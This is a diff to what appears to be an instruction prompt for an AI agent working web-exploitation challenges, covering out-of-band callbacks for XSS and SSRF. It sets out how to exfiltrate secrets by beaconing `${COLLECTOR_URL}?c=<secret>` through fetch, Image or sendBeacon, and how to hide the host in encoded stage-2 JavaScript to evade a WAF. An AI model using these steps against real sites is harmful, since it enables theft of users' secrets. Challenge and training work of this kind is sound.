@@ -109,6 +109,25 @@ ALREADY have is usable. A typing constraint never proves a channel dead.
 
 OUT-OF-BAND CALLBACKS (XSS / SSRF / blind injection)
 -----------------------------------------------------
+REMOTE-BOT EXFIL CAN ONLY USE THE GIVEN CALLBACK URL. This box has NO
+public inbound IP (it sits behind NAT). So when the thing that calls back is
+a REMOTE/PUBLIC bot — an admin headless browser, an external SSRF fetcher,
+anything reaching you over the internet — it CANNOT connect to a listener you
+bind, to your egress/public IP, or to a decimal-IP encoding of this host;
+those connections just hang. The ONLY endpoint a remote bot can reach is the
+operator-provided `COLLECTOR_URL` / `CALLBACK_URL`, and your exfil MUST be an
+OUTBOUND beacon the bot fires AT it (`fetch` / `new Image().src` /
+`navigator.sendBeacon` → `${COLLECTOR_URL}?c=<secret>`). Do NOT burn turns
+binding port 80, calling `getsockname()`, advertising your egress IP, or
+hunting URL-fetch proxies for a remote bot — that is the single biggest
+dead-end on these challenges: a browser-VERIFIED bypass still captures NOTHING
+if it points the bot at a listener the bot can't reach. If the caller is a
+remote bot and neither `COLLECTOR_URL` nor `CALLBACK_URL` is set, that is an
+operator-config gap — say so in report.md and stop; do NOT try to self-host
+inbound. (Dots/colons banned by a WAF do not change this — the host hides in
+an encoded literal inside YOUR served stage-2 JS, which is unrestricted; the
+loader still beacons OUTBOUND to the given URL.)
+
 When the bug requires an external HTTP listener, pick the channel
 based on what's available — in this priority order:
 
@@ -126,7 +145,9 @@ based on what's available — in this priority order:
    Fallback: read `CALLBACK_URL` directly (operator may have set a
    webhook.site-style URL).
 
-2. SAME-NETWORK target → spin up an in-process HTTP listener:
+2. SAME-NETWORK caller ONLY (the bot/fetcher shares a network you can
+   already reach — internal SSRF host, same docker net; NEVER a public
+   bot, per the hard rule above) → spin up an in-process HTTP listener:
 
        import threading, http.server, socket, queue
        captured = queue.Queue()
